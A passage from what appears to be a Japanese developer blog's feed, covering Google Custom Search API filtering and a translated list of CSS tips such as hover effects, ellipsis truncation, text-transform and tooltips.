昔は、クエリにsearchType=image imgType=news をいれれば絞り込めていたみたですが試したところエラーになって現在は使用できなそうです。&lt;/p>
&lt;p>googleの仕様書を見てもimgTypeに現在はnewsは指定できないみたいです。&lt;br>
&lt;a class="link" href="https://developers.google.com/custom-search/v1/reference/rest/v1/cse/list" target="_blank" rel="noopener"
>https://developers.google.com/custom-search/v1/reference/rest/v1/cse/list&lt;/a>&lt;/p>
&lt;h2 id="schemaorg-で絞り込む">schema.org で絞り込む&lt;/h2>
&lt;p>現在は、検索エンジンの設定画面にある「schema.org」を使用して絞り込むみたいです。&lt;/p>
&lt;p>&lt;a class="link" href="https://cse.google.com/cse/" target="_blank" rel="noopener"
>https://cse.google.com/cse/&lt;/a>&lt;/p>
&lt;p>schema.orgで設定できる項目は非常に沢山あって何を設定するか迷います。&lt;/p>
&lt;p>&lt;a class="link" href="https://schema.org/docs/full.html" target="_blank" rel="noopener"
>https://schema.org/docs/full.html&lt;/a>&lt;/p>
&lt;p>10個まで設定できるとのことで、とりあえずArticle,review,newsを文言に含むものにしてみました。&lt;/p>
&lt;p>curlで叩く方法パラメータは今までと全く同じです。&lt;/p>
&lt;pre tabindex="0">&lt;code>curl 'https://www.googleapis.com/customsearch/v1?key=xxxxxxxxxxxxxxxx&amp;amp;cx=xxxxxxxxxxxxxxxxx&amp;amp;q=木材流通統計調査'
&lt;/code>&lt;/pre>&lt;p>ウッドショック 林野庁・農林水産省作成資料 - 一般社団法人 宮城県&lt;br>
木質バイオマス発電のFITは両刃の剣だ（2ページ目） | コラム | 環境&lt;br>
【ウッドショック】木材価格の高騰は私たちにどう影響？ 住宅の&lt;br>
など取得したいコンテンツの絞り込みができました。&lt;/p></description></item><item><title>CSSでもできる！知っておくべき重要なヒントとコツ 8選 8選</title><link>https://suzukiiichiro.github.io/posts/2022-01-19-01-wyoshi/</link><pubDate>Wed, 19 Jan 2022 08:08:44 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-19-01-wyoshi/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-19-01-wyoshi/catch.jpg" alt="Featured image of post CSSでもできる！知っておくべき重要なヒントとコツ 8選 8選" />&lt;p>&lt;strong>出典元&lt;/strong>：&lt;a class="link" href="https://www.makeuseof.com/css-tips-and-tricks-you-must-know/" target="_blank" rel="noopener"
>8 Essential CSS Tips and Tricks Every Developer Should Know&lt;/a>&lt;/p>
&lt;p>CSSは、HTMLスケルトンを設定した後、Webページにスタイルを追加するために使用されます。さらに、わずか数行のコードでCSSで洗練されたデザインを作成できます。&lt;br>
すべての開発者は、プロジェクトを迅速かつ効率的に開発するために、これらのCSSのトリックを知っている必要があります。あなたの生産性を次のレベルに確実に向上させます。&lt;br>
それでは始めてみましょう。&lt;/p>
&lt;h2 id="hover効果">hover効果&lt;/h2>
&lt;p>&lt;code>：hover&lt;/code>セレクターを使用して、HTML要素にホバー効果を追加できます。&lt;/p>
&lt;p>次の例ではボタン要素にホバー効果を追加します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">button&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Hover Over Me&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">button&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="nt">button&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nd">hover&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">color&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mh">#0062FF&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">border&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mh">#0062FF&lt;/span> &lt;span class="kc">solid&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="kt">px&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">background&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mh">#FFFF99&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>このコードをいじって、フェードイン、拡縮、変形などのエフェクトを追加できます。&lt;/p>
&lt;h3 id="cssホバーへのフェードイン効果">CSSホバーへのフェードイン効果&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="nt">button&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="k">opacity&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mf">0.5&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nt">button&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nd">hover&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="k">opacity&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="cssホバーへの拡縮効果">CSSホバーへの拡縮効果&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="nt">button&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nd">hover&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="kp">-webkit-&lt;/span>&lt;span class="k">transform&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">scale&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">1.2&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kp">-ms-&lt;/span>&lt;span class="k">transform&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">scale&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">1.2&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">transform&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">scale&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">1.2&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="divコンテナに合うように画像のサイズを変更します">divコンテナに合うように画像のサイズを変更します&lt;/h2>
&lt;p>height、width、およびobject-fitプロパティを使用して、divコンテナに合うように画像のサイズを変更できます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">img&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;random-image&amp;#34;&lt;/span> &lt;span class="na">src&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;画像ファイル&amp;#34;&lt;/span> &lt;span class="p">/&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">.&lt;/span>&lt;span class="nc">random-image&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">eight&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="kt">%&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">width&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="kt">%&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">object-fit&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">contain&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="すべてのスタイルをオーバーライドする">すべてのスタイルをオーバーライドする&lt;/h2>
&lt;p>&lt;code>!important&lt;/code> を使用して、属性の他のすべてのスタイル宣言（インラインスタイルを含む）をオーバーライドできます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">p&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;className&amp;#34;&lt;/span> &lt;span class="na">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;idName&amp;#34;&lt;/span> &lt;span class="na">style&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;background-color: orange;&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> Hello World! &lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">p&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="nt">p&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">background-color&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">yellow&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nc">className&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">background-color&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">blue&lt;/span> &lt;span class="cp">!important&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">#&lt;/span>&lt;span class="nn">idName&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">background-color&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">green&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>この例では、&lt;code>!important&lt;/code>ルールが他のすべての背景色宣言をオーバーライドし、背景色が緑ではなく青に設定されるようにします。&lt;/p>
&lt;p>ただし、&lt;code>!important&lt;/code> は便利ではありますが、使いすぎると上書きできないといった不具合にもつながるので、できるだけ階層を持ったCSSの記述を心がけてください。&lt;/p>
&lt;h2 id="三点リーダー">三点リーダー&lt;/h2>
&lt;p>&lt;code>text-overflow&lt;/code> のCSSプロパティを使用して、オーバーフローしたテキストを省略記号（&amp;hellip;）で切り捨てることができます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">p&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;text&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> Lorem ipsum dolor sit amet consectetur adipisicing elit, sed do eiusmod tempor. &lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">p&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">.&lt;/span>&lt;span class="nc">text&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">white-space&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">nowrap&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">overflow&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">hidden&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">text-overflow&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">ellipsis&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">width&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">200&lt;/span>&lt;span class="kt">px&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="文字の変形">文字の変形&lt;/h2>
&lt;p>&lt;code>text-transform&lt;/code> CSSプロパティを使用して、テキストを強制的に大文字、小文字、または大文字にすることができます。&lt;/p>
&lt;h3 id="指定文字を大文字にするuppercase">指定文字を大文字にする（Uppercase）&lt;/h3>
&lt;p>&lt;code>text-transform: uppercase;&lt;/code>のCSSを使用すると、クラスなどで指定した範囲をすべて大文字表示にできます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">p&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;uppercase&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> Lorem ipsum dolor sit amet, consectetur adipisicing elit. &lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">p&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">.&lt;/span>&lt;span class="nc">uppercase&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">text-transform&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">uppercase&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="指定文字を小文字にするlowercase">指定文字を小文字にする（Lowercase）&lt;/h3>
&lt;p>&lt;code>text-transform: lowercase;&lt;/code>のCSSを使用することで、クラスなどで指定した範囲をすべて小文字表示にできます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">p&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;lowercase&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> Lorem ipsum dolor sit amet, consectetur adipisicing elit. &lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">p&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">.&lt;/span>&lt;span class="nc">lowercase&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">text-transform&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">lowercase&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="先頭を大文字にcapitalize">先頭を大文字に（Capitalize）&lt;/h3>
&lt;p>先頭文字のみを大文字（Capitalize）したい場合は &lt;code>text-transform: capitalize;&lt;/code> のCSSを使用します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">p&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;capitalize&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> Lorem ipsum dolor sit amet, consectetur adipisicing elit. &lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">p&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>.capitalize { text-transform: capitalize; }
&lt;/code>&lt;/pre>&lt;h2 id="単一行プロパティ宣言の使用">単一行プロパティ宣言の使用&lt;/h2>
&lt;p>CSSの省略形のプロパティを使用して、コードを簡潔で読みやすくすることができます。&lt;br>
たとえば、CSS backgroundは、background-color、background-image、background-repeat、およびbackground-positionの値を定義できる省略形のプロパティです。&lt;br>
同様に、フォント、境界線、マージン、およびパディングのプロパティを定義できます。&lt;/p>
&lt;h3 id="単一行のbackgroundプロパティ宣言">単一行のbackgroundプロパティ宣言&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="nt">background-color&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nt">black&lt;/span>&lt;span class="o">;&lt;/span>
&lt;span class="nt">background-image&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nt">url&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">images&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nt">xyz&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">png&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="nt">background-repeat&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nt">no-repeat&lt;/span>&lt;span class="o">;&lt;/span>
&lt;span class="nt">background-position&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nt">left&lt;/span> &lt;span class="nt">top&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>上記の宣言を1行に簡略化できます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="nt">background&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nt">black&lt;/span> &lt;span class="nt">url&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="nt">images&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nt">xyz&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">png&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="nt">no-repeat&lt;/span> &lt;span class="nt">left&lt;/span> &lt;span class="nt">top&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>省略形のプロパティは非常に使いやすいですが、ブラウザ依存などもあるので、使用する際には、 &lt;a class="link" href="https://developer.mozilla.org/en-US/docs/Web/CSS/Shorthand_properties#tricky_edge_cases" target="_blank" rel="noopener"
>tricky edgecases&lt;/a> （MDN Web Docsで概説されている）を考慮する必要があります。&lt;/p>
&lt;h2 id="ツールチップ">ツールチップ&lt;/h2>
&lt;p>ツールチップは、ユーザーがマウスポインターを要素上に移動したときに、要素に関する詳細情報を表示する方法です。&lt;/p>
&lt;h3 id="右方向のツールチップ">右方向のツールチップ&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;tooltip_div&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
Right Tooltip
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">span&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;tooltip&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>This is the Tooltip text&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">span&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="nt">body&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">text-align&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">center&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nc">tooltip_div&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">position&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">relative&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">display&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">inline-block&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nc">tooltip_div&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="nc">tooltip&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">visibility&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">hidden&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">width&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">170&lt;/span>&lt;span class="kt">px&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">background-color&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">blue&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">color&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mh">#fff&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">text-align&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">center&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">border-radius&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">6&lt;/span>&lt;span class="kt">px&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">padding&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="kt">px&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c">/* Positioning the tooltip */&lt;/span>
&lt;span class="k">position&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">absolute&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">z-index&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">top&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">-5&lt;/span>&lt;span class="kt">px&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">left&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">105&lt;/span>&lt;span class="kt">%&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nc">tooltip_div&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nd">hover&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="nc">tooltip&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">visibility&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">visible&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="左方向のツールチップ">左方向のツールチップ&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;tooltip_div&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
Left Tooltip
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">span&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;tooltip&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>This is the Tooltip text&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">span&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="nt">body&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">text-align&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">center&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nc">tooltip_div&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">position&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">relative&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">display&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">inline-block&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nc">tooltip_div&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="nc">tooltip&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">visibility&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">hidden&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">width&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">170&lt;/span>&lt;span class="kt">px&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">background-color&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">blue&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">color&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mh">#fff&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">text-align&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">center&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">border-radius&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">6&lt;/span>&lt;span class="kt">px&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">padding&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="kt">px&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c">/* Positioning the tooltip */&lt;/span>
&lt;span class="k">position&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">absolute&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">z-index&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">top&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">-5&lt;/span>&lt;span class="kt">px&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">right&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">105&lt;/span>&lt;span class="kt">%&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nc">tooltip_div&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nd">hover&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="nc">tooltip&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">visibility&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">visible&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="上方向のツールチップ">上方向のツールチップ&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;tooltip_div&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
Top Tooltip
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">span&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;tooltip&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>This is the Tooltip text&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">span&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="nt">body&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">text-align&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">center&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nc">tooltip_div&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">position&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">relative&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">display&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">inline-block&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nc">tooltip_div&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="nc">tooltip&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">visibility&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">hidden&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">width&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">170&lt;/span>&lt;span class="kt">px&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">background-color&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">blue&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">color&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mh">#fff&lt;/span>&lt;span class="p">;&lt;/span>
